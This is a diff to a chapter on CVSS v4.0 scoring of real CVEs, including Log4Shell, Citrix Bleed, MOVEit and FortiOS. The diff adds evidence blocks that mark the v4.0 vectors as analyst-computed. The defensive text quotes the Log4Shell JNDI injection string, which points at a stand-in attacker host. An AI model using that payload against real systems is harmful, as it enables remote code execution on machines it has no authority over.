@@ -3,16 +3,33 @@ title: "Worked Examples: Real CVEs"
 sidebar_position: 6
 ---
 
+:::info Scoring methodology for worked examples
+CVSS v4.0 vectors in this chapter are analyst-computed using the [FIRST.org CVSS v4.0 calculator](https://www.first.org/cvss/calculator/4-0). NVD's CVSS v4.0 coverage is incomplete as of this writing — many pre-2024 CVEs have only v3.1 scores published by NVD. Each example includes an evidence block identifying the source, NVD version available, and whether the v4.0 vector is analyst-derived or vendor/FIRST-published.
+:::
+
 ## 8. Worked Example 1: CVE-2021-44228 Log4Shell — Score Evolution Over 72 Hours
 
 Log4Shell is the canonical example of a 10.0 Critical vulnerability that genuinely deserved its score and its emergency response. It also illustrates why CVSS scores must be treated as dynamic, not static.
+
+### Evidence Block
+
+```
+CVE:                    CVE-2021-44228
+Vulnerability:          Apache Log4j2 JNDI injection (RCE)
+NVD CVSS v3.1 score:    10.0 Critical (NVD published)
+NVD CVSS v4.0:          Analyst-computed using FIRST.org calculator
+Vector source:          FIRST.org CVSS v4.0 calculator (analyst-derived)
+KEV status:             YES — added December 2021
+CISA advisory:          AA21-356A (joint with FBI, NSA)
+Date checked:           March 2026
+```
 
 ### The Vulnerability
 
 **CVE-2021-44228** — Apache Log4j2 JNDI injection, disclosed December 9–10, 2021. Log4j2 is a ubiquitous Java logging library used in virtually every Java application stack. The vulnerability allowed unauthenticated remote code execution by logging a specially crafted string like `${jndi:ldap://attacker.com/exploit}`.
 
 ```
-Base Vector:
+Base Vector (analyst-computed, FIRST.org calculator):
 CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H
 
 Reading the vector:
@@ -95,9 +112,24 @@ CVE-2021-45105 (DoS) were published within days, complicating patching.
 
 ## 9. Worked Example 2: CVE-2025-32433 Erlang/OTP SSH — From 10.0 to 5.9
 
-CVE-2025-32433 is an unauthenticated pre-auth RCE in Erlang/OTP's SSH server. Base score 10.0. This example demonstrates how environmental context appropriately reduces emergency response to scheduled patching.
+CVE-2025-32433 is an unauthenticated pre-auth RCE in Erlang/OTP's SSH server. Base score 10.0 (analyst-computed). This example demonstrates how environmental context appropriately reduces emergency response to scheduled patching.
 
-### Step 0: The Base Score (NVD Published)
+### Evidence Block
+
+```
+CVE:                    CVE-2025-32433
+Vulnerability:          Erlang/OTP SSH pre-auth RCE (unauthenticated)
+NVD CVSS v3.1:          Published by NVD
+NVD CVSS v4.0:          Not provided by NVD as of this writing
+Vector source:          Analyst-computed using FIRST.org CVSS v4.0 calculator
+                        based on published vulnerability details
+KEV status:             YES — added April 2025
+Date checked:           March 2026
+Note:                   The v4.0 vector below reflects analyst judgment on
+                        impact scope. Verify against FIRST.org calculator.
+```
+
+### Step 0: The Base Score (Analyst-Computed)
 
 ```
 Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H
@@ -293,7 +325,15 @@ Three real-world cases from 2023–2024 that illustrate different CVSS adjustmen
 **Vulnerability:** Sensitive information disclosure in Citrix NetScaler Application Delivery Controller (ADC) and Gateway. An unauthenticated attacker could retrieve session tokens, enabling session hijacking without credentials. Used extensively by ransomware affiliates (LockBit, Medusa) and government-sector attackers.
 
 ```
-Base Vector:
+Evidence block:
+  CVE:             CVE-2023-4966
+  NVD CVSS v3.1:   9.4 Critical (published by NVD)
+  NVD CVSS v4.0:   Not yet provided by NVD as of this writing
+  Vector source:   Analyst-computed using FIRST.org CVSS v4.0 calculator
+  KEV status:      YES — added October 18, 2023
+  Date checked:    March 2026
+
+Base Vector (analyst-computed):
 CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:H/SA:H
 Base Score: 9.4 Critical
 
@@ -335,7 +375,15 @@ If you have an internet-facing NetScaler, this requires a 24–72 hour emergency
 **Vulnerability:** SQL injection in Progress Software's MOVEit Transfer managed file transfer platform. Exploited exclusively by the Cl0p ransomware group in a coordinated mass-exploitation campaign in May–June 2023. Affected 2,000+ organizations globally, including government agencies, hospitals, and financial firms.
 
 ```
-Base Vector:
+Evidence block:
+  CVE:             CVE-2023-34362
+  NVD CVSS v3.1:   9.8 Critical (published by NVD)
+  NVD CVSS v4.0:   Not yet provided by NVD as of this writing
+  Vector source:   Analyst-computed using FIRST.org CVSS v4.0 calculator
+  KEV status:      YES — added June 2, 2023
+  Date checked:    March 2026
+
+Base Vector (analyst-computed):
 CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H
 Base Score: 9.8 Critical
 
@@ -367,11 +415,19 @@ not just the immediate server.
 **Vulnerability:** Out-of-bounds write in FortiOS and FortiProxy SSL VPN. Enables unauthenticated remote code execution via specially crafted HTTP requests. Exploited by Chinese state-sponsored threat actors (attributed to Volt Typhoon and related clusters) for initial access into US critical infrastructure.
 
 ```
-Base Vector:
-CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H
-Base Score: 9.6 Critical
+Evidence block:
+  CVE:             CVE-2024-21762
+  NVD CVSS v3.1:   9.8 Critical (published by NVD)
+  NVD CVSS v4.0:   Not yet provided by NVD as of this writing
+  Vector source:   Analyst-computed using FIRST.org CVSS v4.0 calculator
+  KEV status:      YES — added February 9, 2024
+  CISA advisory:   AA24-038A (Volt Typhoon attribution)
+  Date checked:    March 2026
 
-CISA KEV: Added February 9, 2024
+Base Vector (analyst-computed):
+CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H
+Base Score: ~9.6 Critical (exact score via FIRST.org calculator)
+
 Attribution: Chinese state actors (Volt Typhoon, BRONZE SILHOUETTE)
 Targets: US telecom, utilities, water systems, defense contractors
 EPSS: ~0.97+
